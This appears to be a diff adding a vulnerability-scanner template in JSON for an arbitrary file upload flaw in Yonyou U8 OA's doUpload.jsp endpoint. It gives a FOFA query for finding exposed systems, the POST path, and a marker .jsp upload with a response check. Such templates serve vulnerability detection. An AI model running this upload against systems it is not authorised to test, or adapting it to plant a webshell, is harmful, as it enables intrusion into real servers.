@@ -1,0 +1,40 @@
+{
+  "product": "用友U8 OA",
+  "vul_name": "用友U8 OA doUpload.jsp接口任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友U8-OA 协同工作系统遵循 J2EE 架构,以 JSP 和 JAVA BEAN 技术作为主要的系统实现手段,开发出了工作流、文档、消息提醒和插件接口。用友U8-OA协同工作系统doUpload.jsp接口存在任意文件上传漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "title=\"用友U8-OA\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_56698744/article/details/136271401",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/yyoa/portal/tools/doUpload.jsp",
+      "file": {
+        "myfile": [
+          "52e039302a62d077.jsp",
+          "95cc64dd2825f9df13ec4ad683ecf339",
+          "application/octet-stream"
+        ]
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "window.returnValue = "
+        }
+      ]
+    }
+  }
+}
